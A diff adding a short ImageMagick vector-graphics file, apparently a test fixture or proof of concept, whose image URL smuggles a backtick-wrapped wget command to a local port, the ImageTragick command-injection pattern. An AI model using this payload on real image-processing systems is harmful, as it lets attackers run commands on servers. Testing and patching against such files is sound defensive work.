@@ -1,0 +1,4 @@
+push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 127.0.0.1:1337 > /dev/null`'
+pop graphic-context
